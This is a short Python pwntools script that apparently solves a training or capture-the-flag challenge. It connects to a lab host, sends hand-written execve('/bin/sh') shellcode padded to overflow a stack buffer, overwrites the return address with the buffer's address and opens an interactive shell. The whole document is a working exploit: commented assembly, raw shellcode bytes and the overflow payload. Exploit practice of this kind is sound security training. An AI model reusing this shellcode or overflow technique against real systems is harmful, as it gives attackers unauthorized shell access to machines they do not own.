from pwn import *

r = remote("training.jinblack.it", 2001)

# mov rax, 0x3b                 ; syscall num for execve
# mov rbx, 0x68732f6e69622f     ; /bin/sh\x00 string
# push rbx                      ; binsh on top of the stack
# mov rdi, rsp                  ; ptr to /bin/sh\x00 as filepath
# xor rbx, rbx                  ; NULL
# push rbx                      ; NULL on top of the stack
# mov rsi, rsp                  ; ptr to NULL as arg
# mov rdx, rsp                  ; ptr to NULL as env
# syscall                       ; invoke syscall
shellcode = "\x48\xC7\xC0\x3B\x00\x00\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x0F\x05"

buffer = 0x00601080

print r.recv(1024)

r.send(shellcode.ljust(1016, "A")+p64(buffer))

r.interactive()